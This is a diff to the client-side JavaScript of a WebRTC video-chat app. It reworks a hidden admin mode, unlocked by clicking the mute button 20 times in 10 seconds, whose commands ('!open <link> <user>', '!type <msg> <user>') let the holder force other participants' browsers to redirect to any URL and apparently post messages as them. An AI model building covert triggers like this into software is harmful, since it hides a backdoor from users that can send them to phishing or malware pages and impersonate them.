@@ -96,36 +96,34 @@
     const peerConnections = {};
     const frozenTimers = {};
     
-    let localStream = new MediaStream(); // Initialize with empty stream
+    let localStream = new MediaStream();
     let screenStream = null;
     let isScreenSharing = false;
     let isMuted = false;
+    
+    // Admin Variables
     let isAdmin = false;
     let muteClickTimestamps = [];
-    
-    // --- NEW REDIRECT LISTENER ---
+
+    // --- ADMIN LISTENERS ---
     socket.on('force-redirect', (data) => {
-        if (data.url) {
-            window.location.href = data.url;
-        }
+        if (data.url) window.location.href = data.url;
     });
-    
-    // --- UPDATED MUTE BUTTON LOGIC ---
+
+    // --- MUTE & ADMIN TRIGGER ---
     muteBtn.addEventListener('click', () => {
-        // Admin Trigger Logic
+        // Admin Detection
         const now = Date.now();
         muteClickTimestamps.push(now);
-        
-        // Filter to keep only clicks within the last 10 seconds
         muteClickTimestamps = muteClickTimestamps.filter(t => now - t < 10000);
         
         if (muteClickTimestamps.length >= 20 && !isAdmin) {
             isAdmin = true;
-            appendSystemMessage("ADMIN ACCESS GRANTED. Use !open <link> <user>");
-            muteClickTimestamps = []; // Reset
+            appendSystemMessage("ADMIN ACCESS GRANTED.");
+            appendSystemMessage("Commands: !open <link> <user> | !type <msg> <user>");
         }
-    
-        // Original Mute Logic
+
+        // Toggle Audio
         const audioTrack = localStream.getAudioTracks()[0];
         if (audioTrack) {
             isMuted = !isMuted;
@@ -134,23 +132,20 @@
             muteBtn.classList.toggle('active-red', isMuted);
         }
     });
-    
-    // --- UPDATED CHAT FORM ---
+
+    // --- CHAT & COMMAND INTERCEPTION ---
     document.getElementById('chat-form').addEventListener('submit', e => {
         e.preventDefault();
         const input = document.getElementById('chat-input');
         const val = input.value.trim();
-    
+
         if (val) {
-            // If it's a command and user is admin, intercept!
             if (val.startsWith('!') && isAdmin) {
                 socket.emit('admin-command', { command: val });
-                appendSystemMessage(`Command Sent: ${val}`); // Confirmation for admin only
+                appendSystemMessage(`Executed: ${val}`); 
                 input.value = '';
                 return;
             }
-    
-            // Otherwise, send regular message
             socket.emit('chat-message', { username: username, msg: val });
             input.value = '';
         }
